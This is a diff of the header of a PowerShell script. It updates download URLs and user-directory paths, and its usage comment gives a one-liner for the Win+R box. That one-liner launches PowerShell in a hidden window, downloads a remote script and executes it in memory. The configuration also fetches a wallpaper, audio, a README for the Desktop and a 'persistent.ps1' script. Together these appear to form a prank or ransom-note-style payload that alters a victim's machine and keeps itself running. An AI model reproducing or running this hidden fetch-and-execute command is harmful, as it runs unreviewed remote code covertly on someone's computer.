@@ -1,17 +1,17 @@
 # USAGE:
 # Win + R:
-# powershell -w h -c ". ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/GRADLOVE/amor.ps1").Content))))"
+# powershell -w h -c ". ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/gradlove/amor.ps1").Content))))"
 # Powershell:
-# . ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/GRADLOVE/amor.ps1").Content))))
+# . ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/gradlove/amor.ps1").Content))))
 
 $Data = @{
-    WallpaperURL              = "https://juanbanpar.github.io/GRADLOVE/files/wall.jpg"
-    GifURL                    = "https://juanbanpar.github.io/GRADLOVE/files/heart-locket.gif"
-    MusicURL                  = "https://juanbanpar.github.io/GRADLOVE/files/music.wav"
-    PersistentURL             = "https://juanbanpar.github.io/GRADLOVE/files/persistent.ps1"
-    ReadmeURL                 = "https://juanbanpar.github.io/GRADLOVE/README_WINDOWS.txt"
-    DownloadDirectory         = "%USERPROFILE%\amor"
-    ReadmeDirectory           = "%USERPROFILE%\Desktop"
+    WallpaperURL              = "https://juanbanpar.github.io/gradlove/files/wall.jpg"
+    GifURL                    = "https://juanbanpar.github.io/gradlove/files/heart-locket.gif"
+    MusicURL                  = "https://juanbanpar.github.io/gradlove/files/music.wav"
+    PersistentURL             = "https://juanbanpar.github.io/gradlove/persistent.ps1"
+    ReadmeURL                 = "https://juanbanpar.github.io/gradlove/README_WINDOWS.txt"
+    DownloadDirectory         = "$env:USERPROFILE\amor"
+    ReadmeDirectory           = "$env:USERPROFILE\Desktop"
 }
 
 $WallpaperDest  = $($Data.DownloadDirectory + "\Wallpaper." + ($Data.WallpaperURL -replace ".*\."))
